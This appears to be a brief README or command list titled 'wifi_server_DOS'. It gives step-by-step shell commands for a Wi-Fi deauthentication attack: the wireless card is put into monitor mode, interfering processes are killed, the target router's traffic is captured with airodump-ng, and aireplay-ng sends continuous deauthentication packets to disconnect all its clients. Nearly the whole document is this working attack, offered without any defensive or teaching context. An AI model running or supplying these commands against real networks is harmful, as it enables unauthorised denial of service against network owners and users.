# wifi_server_DOS
sudo -s


ifconfig wlo1 down


iwconfig wlo1 mode monitor


ifconfig wlo1 up


airmon-ng check wlo1


<(kill NetworkManager  >>  then dhclient  >> then all others)>


airodump-ng -c 6 -w SCAN_test1 --bssid <mac_address_of_router> wlo1


aireplay-ng -0 0 -a <mac_address_of_router> wlo1


# wifi_server_DOS
# wifi_server_DOS
